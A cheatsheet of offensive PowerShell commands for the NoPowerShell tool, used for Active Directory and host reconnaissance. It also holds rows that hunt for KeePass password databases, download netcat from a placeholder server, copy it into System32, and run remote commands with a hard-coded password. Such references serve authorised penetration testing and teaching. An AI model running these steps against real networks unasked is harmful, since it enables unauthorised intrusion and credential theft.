# Cheatsheet
Cheatsheet of offensive PowerShell commands that are supported by NoPowerShell.

| Action | Command | Notes |
| - | - | - |
| List all commands supported by NoPowerShell | `Get-Command` | |
| Get help for a command | `Get-Help -Name Get-Process` | Alternative: `man ps` |
| Show current user | `whoami` | Unofficial command |
| List SMB shares of MyServer | `Get-RemoteSmbShare \\MyServer` | Unofficial command |
| List all user groups in domain | `Get-ADGroup -Filter *` | |
| List all administrative groups in domain | `Get-ADGroup -LDAPFilter "(admincount=1)" \| select Name` | |
| List all properties of the Administrator domain user | `Get-ADUser -Identity Administrator -Properties *` | |
| List all Administrative users in domain | `Get-ADUser -LDAPFilter "(admincount=1)"` | |
| List all users in domain | `Get-ADUser -Filter *` | |
| List specific attributes of user | `Get-ADUser Administrator -Properties SamAccountName,ObjectSID` | |
| Show information about the current system | `Get-ComputerInfo` | |
| List all processes containing PowerShell in the process name | `Get-Process \| ? Name -Like *PowerShell*` | |
| List all active local users | `Get-LocalUser \| ? Disabled -EQ False` | |
| List all local groups | `Get-LocalGroup` | |
| List details of a specific group | `Get-LocalGroup Administrators` | |
| List all active members of the Administrators group | `Get-LocalGroupMember -Group Administrators \| ? Disabled -eq False` | |
| List all local users | `Get-LocalUser` | |
| List details of a specific user | `Get-LocalUser Administrator` | |
| List all properties of the DC01 domain computer | `Get-ADComputer -Identity DC01 -Properties *` | |
| List all Domain Controllers | `Get-ADComputer -LDAPFilter "(msDFSR-ComputerReferenceBL=*)"` | |
| List all computers in domain | `Get-ADComputer -Filter *` | |
| List specific attributes of user | `Get-ADComputer DC01 -Properties Name,operatingSystem` | |
| Copy file from one location to another | `copy C:\Tmp\nc.exe C:\Windows\System32\nc.exe` | |
| Copy folder | `copy C:\Tmp\MyFolder C:\Tmp\MyFolderBackup` | |
| Locate KeePass files in the C:\Users\ directory | `ls -Recurse -Force C:\Users\ -Include *.kdbx` | |
| List the keys under the SOFTWARE key in the registry | `ls HKLM:\SOFTWARE` | |
| View contents of a file | `Get-Content C:\Windows\WindowsUpdate.log` | |
| List autoruns in the registry | `Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run \| ft` | |
| List processes | `Get-Process` | |
| List processes on remote host | `Get-Process -ComputerName dc01.corp.local -Username Administrator -Password P4ssw0rd!` | |
| Gracefully stop processes | `Stop-Process -Id 4512,7241` | |
| Kill process | `Stop-Process -Force -Id 4512` | |
| Kill all cmd.exe processes | `Get-Process cmd \| Stop-Process -Force` | |
| Obtain data of Win32_Process class from a remote system and apply a filter on the output | `gwmi "Select ProcessId,Name,CommandLine From Win32_Process" -ComputerName dc01.corp.local \| ? Name -Like *PowerShell* \| select ProcessId,CommandLine` | Explicit credentials can be specified using the `-Username` and `-Password` parameters |
| View details about a certain service | `Get-WmiObject -Class Win32_Service -Filter "Name = 'WinRM'"` | |
| Launch process using WMI | `Invoke-WmiMethod -Class Win32_Process -Name Create "cmd /c calc.exe"` | This can also be done on a remote system |
| Delete a read-only file | `Remove-Item -Force C:\Tmp\MyFile.txt` | |
| Recursively delete a folder | `Remove-Item -Recurse C:\Tmp\MyTools\` | |
| Show all network interfaces | `Get-NetIPAddress -All` | |
| Show the IP routing table | `Get-NetRoute` | |
| List ARP cache | `Get-NetNeighbor` | Alternative: `arp` |
| Send 2 ICMP requests to IP address 1.1.1.1 with half a second of timeout | `Test-NetConnection -Count 2 -Timeout 500 1.1.1.1` | |
| Perform ping with maximum TTL specified | `ping -TTL 32 1.1.1.1` | |
| Perform a traceroute with a timeout of 1 second and a maximum of 20 hops | `Test-NetConnection -TraceRoute -Timeout 1000 -Hops 20 google.com` | |
| Check for open port | `tnc bitsadm.in -Port 80` | |
| List network shares on the local machine that are exposed to the network | `Get-SmbMapping` | |
| Format output as a list | `Get-LocalUser \| fl` | |
| Format output as a list showing only specific attributes | `Get-LocalUser \| fl Name,Description` | |
| Format output as a table | `Get-Process \| ft` | |
| Format output as a table showing only specific attributes | `Get-Process \| ft ProcessId,Name` | |
| Download file from the Internet | `wget http://myserver.me/nc.exe` | When compiled using .NET 2 only supports SSL up to SSLv3 (no TLS 1.1+) |
| Download file from the Internet specifying the destination | `wget http://myserver.me/nc.exe -OutFile C:\Tmp\netcat.exe` | |
| Count number of results | `Get-Process \| measure` | |
| Count number of lines in file | `gc C:\Windows\WindowsUpdate.log \| measure` | |
| Show only the Name in a file listing | `ls C:\ \| select Name` | |
| Show first 10 results of file listing | `ls C:\Windows\System32 -Include *.exe \| select -First 10 Name,Length` | |
| List all members of the "Domain Admins" group | `Get-ADGroupMember "Domain Admins"` | |
| Resolve domain name | `Resolve-DnsName microsoft.com` | Alternatives: `host linux.org`, `Resolve-DnsName -Type MX pm.me` |
| List local shares | `Get-WmiObject -Namespace ROOT\CIMV2 -Query "Select * From Win32_Share Where Name LIKE '%$'"` | Alternative: `gwmi -Class Win32_Share -Filter "Name LIKE '%$'"` |
| Show network interfaces | `Get-NetIPAddress` | Alternatives: `ipconfig`, `ifconfig` |
| Show computer information | `Get-ComputerInfo` | Alternative: `systeminfo` |
| List installed hotfixes | `Get-HotFix` | The output of this cmdlet together with the output of the `Get-ComputerInfo` cmdlet can be provided to [WES-NG](https://github.com/bitsadmin/wesng/) to determine missing patches |
| List local drives | `Get-PSDrive` | |
| Compress folder to zip | `Compress-Archive -Path C:\MyFolder -DestinationPath C:\MyFolder.zip` | Only available when compiled against .NET 4.5+ |
| Extract zip | `Expand-Archive -Path C:\MyArchive.zip -DestinationPath C:\Extracted` | Alternative: `unzip C:\MyArchive.zip`. Only available when compiled against .NET 4.5+ |
